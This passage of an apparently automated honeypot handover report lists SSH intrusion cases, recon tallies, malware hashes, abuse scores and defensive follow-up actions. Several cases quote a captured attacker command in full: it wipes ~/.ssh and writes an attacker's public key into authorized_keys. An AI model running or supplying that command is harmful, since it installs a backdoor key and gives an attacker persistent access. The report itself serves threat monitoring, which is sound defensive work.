| `2026-05-03 07:37:58` | `cowrie.log.closed` |
| `2026-05-03 07:38:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6079dafbc01

| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-05-03 07:38 |
| **Last Seen** | 2026-05-03 07:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 07:38:01` | `cowrie.session.connect` |
| `2026-05-03 07:38:01` | `cowrie.client.version` |
| `2026-05-03 07:38:01` | `cowrie.client.kex` |
| `2026-05-03 07:38:02` | `cowrie.login.success` |
| `2026-05-03 07:38:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e83fe9fba66d

| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-05-03 07:40 |
| **Last Seen** | 2026-05-03 07:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 07:40:45` | `cowrie.session.connect` |
| `2026-05-03 07:40:45` | `cowrie.client.version` |
| `2026-05-03 07:40:46` | `cowrie.client.kex` |
| `2026-05-03 07:40:46` | `cowrie.login.success` |
| `2026-05-03 07:40:47` | `cowrie.session.params` |
| `2026-05-03 07:40:47` | `cowrie.command.input` |
| `2026-05-03 07:40:47` | `cowrie.command.failed` |
| `2026-05-03 07:40:47` | `cowrie.log.closed` |
| `2026-05-03 07:40:47` | `cowrie.session.params` |
| `2026-05-03 07:40:47` | `cowrie.command.input` |
| `2026-05-03 07:40:48` | `cowrie.session.file_download` |
| `2026-05-03 07:40:48` | `cowrie.log.closed` |
| `2026-05-03 07:40:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f87e2ee81522

| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-05-03 07:40 |
| **Last Seen** | 2026-05-03 07:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 07:40:50` | `cowrie.session.connect` |
| `2026-05-03 07:40:50` | `cowrie.client.version` |
| `2026-05-03 07:40:50` | `cowrie.client.kex` |
| `2026-05-03 07:40:51` | `cowrie.login.success` |
| `2026-05-03 07:40:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-508c86ce9b28

| Field | Detail |
|---|---|
| **Source IP** | `103.233.206[.]154` |
| **First Seen** | 2026-05-03 08:01 |
| **Last Seen** | 2026-05-03 08:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 08:01:11` | `cowrie.session.connect` |
| `2026-05-03 08:01:11` | `cowrie.client.version` |
| `2026-05-03 08:01:12` | `cowrie.client.kex` |
| `2026-05-03 08:01:12` | `cowrie.login.success` |
| `2026-05-03 08:01:12` | `cowrie.session.params` |
| `2026-05-03 08:01:12` | `cowrie.command.input` |
| `2026-05-03 08:01:12` | `cowrie.command.failed` |
| `2026-05-03 08:01:12` | `cowrie.log.closed` |
| `2026-05-03 08:01:13` | `cowrie.session.params` |
| `2026-05-03 08:01:13` | `cowrie.command.input` |
| `2026-05-03 08:01:13` | `cowrie.session.file_download` |
| `2026-05-03 08:01:13` | `cowrie.log.closed` |
| `2026-05-03 08:01:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.233.206[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.233.206[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fee046f6fb3f

| Field | Detail |
|---|---|
| **Source IP** | `103.233.206[.]154` |
| **First Seen** | 2026-05-03 08:01 |
| **Last Seen** | 2026-05-03 08:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 08:01:17` | `cowrie.session.connect` |
| `2026-05-03 08:01:17` | `cowrie.client.version` |
| `2026-05-03 08:01:17` | `cowrie.client.kex` |
| `2026-05-03 08:01:18` | `cowrie.login.success` |
| `2026-05-03 08:01:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.233.206[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.233.206[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2d856026da0

| Field | Detail |
|---|---|
| **Source IP** | `103.233.206[.]154` |
| **First Seen** | 2026-05-03 08:26 |
| **Last Seen** | 2026-05-03 08:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 08:26:06` | `cowrie.session.connect` |
| `2026-05-03 08:26:06` | `cowrie.client.version` |
| `2026-05-03 08:26:06` | `cowrie.client.kex` |
| `2026-05-03 08:26:06` | `cowrie.login.success` |
| `2026-05-03 08:26:07` | `cowrie.session.params` |
| `2026-05-03 08:26:07` | `cowrie.command.input` |
| `2026-05-03 08:26:07` | `cowrie.command.failed` |
| `2026-05-03 08:26:07` | `cowrie.log.closed` |
| `2026-05-03 08:26:07` | `cowrie.session.params` |
| `2026-05-03 08:26:07` | `cowrie.command.input` |
| `2026-05-03 08:26:07` | `cowrie.session.file_download` |
| `2026-05-03 08:26:07` | `cowrie.log.closed` |
| `2026-05-03 08:26:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.233.206[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.233.206[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e083c8ea01b

| Field | Detail |
|---|---|
| **Source IP** | `103.233.206[.]154` |
| **First Seen** | 2026-05-03 08:26 |
| **Last Seen** | 2026-05-03 08:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 08:26:09` | `cowrie.session.connect` |
| `2026-05-03 08:26:09` | `cowrie.client.version` |
| `2026-05-03 08:26:10` | `cowrie.client.kex` |
| `2026-05-03 08:26:10` | `cowrie.login.success` |
| `2026-05-03 08:26:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.233.206[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.233.206[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c9d006703a8

| Field | Detail |
|---|---|
| **Source IP** | `103.233.206[.]154` |
| **First Seen** | 2026-05-03 08:29 |
| **Last Seen** | 2026-05-03 08:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 08:29:13` | `cowrie.session.connect` |
| `2026-05-03 08:29:13` | `cowrie.client.version` |
| `2026-05-03 08:29:14` | `cowrie.client.kex` |
| `2026-05-03 08:29:15` | `cowrie.login.success` |
| `2026-05-03 08:29:15` | `cowrie.session.params` |
| `2026-05-03 08:29:15` | `cowrie.command.input` |
| `2026-05-03 08:29:15` | `cowrie.command.failed` |
| `2026-05-03 08:29:15` | `cowrie.log.closed` |
| `2026-05-03 08:29:15` | `cowrie.session.params` |
| `2026-05-03 08:29:15` | `cowrie.command.input` |
| `2026-05-03 08:29:16` | `cowrie.session.file_download` |
| `2026-05-03 08:29:16` | `cowrie.log.closed` |
| `2026-05-03 08:29:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.233.206[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.233.206[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6e6e2827c34

| Field | Detail |
|---|---|
| **Source IP** | `103.233.206[.]154` |
| **First Seen** | 2026-05-03 08:29 |
| **Last Seen** | 2026-05-03 08:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 08:29:22` | `cowrie.session.connect` |
| `2026-05-03 08:29:22` | `cowrie.client.version` |
| `2026-05-03 08:29:22` | `cowrie.client.kex` |
| `2026-05-03 08:29:23` | `cowrie.login.success` |
| `2026-05-03 08:29:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.233.206[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.233.206[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b97fa8f4c49d

| Field | Detail |
|---|---|
| **Source IP** | `103.233.206[.]154` |
| **First Seen** | 2026-05-03 08:35 |
| **Last Seen** | 2026-05-03 08:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 08:35:30` | `cowrie.session.connect` |
| `2026-05-03 08:35:30` | `cowrie.client.version` |
| `2026-05-03 08:35:30` | `cowrie.client.kex` |
| `2026-05-03 08:35:31` | `cowrie.login.success` |
| `2026-05-03 08:35:31` | `cowrie.session.params` |
| `2026-05-03 08:35:31` | `cowrie.command.input` |
| `2026-05-03 08:35:31` | `cowrie.command.failed` |
| `2026-05-03 08:35:31` | `cowrie.log.closed` |
| `2026-05-03 08:35:32` | `cowrie.session.params` |
| `2026-05-03 08:35:32` | `cowrie.command.input` |
| `2026-05-03 08:35:32` | `cowrie.session.file_download` |
| `2026-05-03 08:35:32` | `cowrie.log.closed` |
| `2026-05-03 08:35:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.233.206[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.233.206[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68d19afe7ebb

| Field | Detail |
|---|---|
| **Source IP** | `103.233.206[.]154` |
| **First Seen** | 2026-05-03 08:35 |
| **Last Seen** | 2026-05-03 08:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 08:35:34` | `cowrie.session.connect` |
| `2026-05-03 08:35:34` | `cowrie.client.version` |
| `2026-05-03 08:35:35` | `cowrie.client.kex` |
| `2026-05-03 08:35:35` | `cowrie.login.success` |
| `2026-05-03 08:35:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.233.206[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.233.206[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `101.126.64[.]76` | **31** | 2026-05-03 07:23 | 2026-05-03 08:37 | 58m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.233.206[.]154` | **30** | 2026-05-03 07:18 | 2026-05-03 08:54 | 1m | 28 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `185.16.214[.]226` | **30** | 2026-05-03 07:19 | 2026-05-03 07:45 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `217.154.106[.]153` | **29** | 2026-05-03 06:41 | 2026-05-03 07:09 | 0m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.86[.]183` | **16** | 2026-05-03 06:31 | 2026-05-03 07:07 | 30m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.76.226[.]129` | **2** | 2026-05-03 08:00 | 2026-05-03 08:02 | 2m | 0 | `T1592` | 🟢 LOW |
| `41.59.229[.]33` | **2** | 2026-05-03 06:29 | 2026-05-03 06:31 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `178.128.181[.]104` | 1 | 2026-05-03 06:47 | 2026-05-03 06:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `182.218.105[.]49` | 1 | 2026-05-03 08:00 | 2026-05-03 08:01 | 30s | 0 | `T1592` | 🟢 LOW |
| `190.120.253[.]214` | 1 | 2026-05-03 08:19 | 2026-05-03 08:19 | 13s | 0 | `T1592` | 🟢 LOW |
| `190.120.255[.]29` | 1 | 2026-05-03 06:41 | 2026-05-03 06:41 | 12s | 0 | `T1592` | 🟢 LOW |
| `211.104.215[.]184` | 1 | 2026-05-03 08:14 | 2026-05-03 08:15 | 13s | 0 | `T1592` | 🟢 LOW |
| `213.149.181[.]32` | 1 | 2026-05-03 06:43 | 2026-05-03 06:43 | 13s | 0 | `T1592` | 🟢 LOW |
| `223.109.200[.]241` | 1 | 2026-05-03 07:23 | 2026-05-03 07:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.23.218[.]218` | 1 | 2026-05-03 08:06 | 2026-05-03 08:07 | 31s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (26 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/74** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `211.104.215[.]184` | KR | Korea Telecom | **100** ⚠️ | 6 |
| `180.76.226[.]129` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 5 |
| `45.23.218[.]218` | US | AT&T Enterprises, LLC | **100** ⚠️ | 14 |
| `190.120.253[.]214` | VE | CORPORACION FIBEX TELECOM, C.A. | **100** ⚠️ | 6 |
| `213.149.181[.]32` | CY | Cyprus Telecommuncations Authority | **100** ⚠️ | 50 |
| `14.103.86[.]183` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `41.59.229[.]33` | TZ | TANZANIA TELECOMMUNICATIONS CO. LTD | **100** ⚠️ | 50 |
| `182.218.105[.]49` | KR | LG POWERCOMM | **100** ⚠️ | 26 |
| `217.154.106[.]153` | ES | IONOS SE | **100** ⚠️ | 50 |
| `101.126.64[.]76` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 161 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 92 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 21 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 11 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 11 |

---

## 🔕 False Positive Summary (25 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 19 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 194 cases |
| Tool 34  | Credential Extractor        | ✅ 113 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 30 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 25 filtered (12.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 28 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 26 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 21 priority case(s) shown individually · 15 recon entry/entries in table (7 group(s) consolidating 140 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
